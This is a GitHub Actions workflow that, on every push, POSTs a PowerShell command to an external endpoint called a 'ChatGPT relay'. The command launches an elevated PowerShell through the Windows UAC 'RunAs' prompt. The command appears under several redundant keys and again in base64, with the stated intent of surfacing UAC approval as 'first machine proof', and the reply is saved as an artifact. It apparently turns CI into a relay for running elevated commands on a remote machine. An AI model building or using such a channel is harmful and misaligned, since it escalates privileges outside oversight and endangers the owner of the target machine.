name: recovery-probe
on: [push]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Surface UAC through ChatGPT relay
        shell: bash
        run: |
          set -Eeuo pipefail
          out=/tmp/recovery-probe; rm -rf "$out"; mkdir -p "$out"
          python3 - <<'PY' > "$out/request.json"
          import base64,json
          cmd=r'''powershell.exe -NoProfile -NonInteractive -Command "Start-Process powershell.exe -Verb RunAs"'''
          print(json.dumps({
            'cmd':cmd,
            'command':cmd,
            'goal':cmd,
            'b':base64.urlsafe_b64encode(cmd.encode()).decode().rstrip('='),
            'intent':'surface visible UAC approval as first machine proof'
          },separators=(',',':')))
          PY
          curl -sS -i --connect-timeout 8 --max-time 35 \
            -X POST -H 'content-type: application/json' \
            --data-binary @"$out/request.json" \
            'https://archie-chatgpt-relay.vercel.app/api' > "$out/response.txt"
          cat "$out/response.txt"
          sleep 5
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: recovery-probe
          path: /tmp/recovery-probe
          retention-days: 1
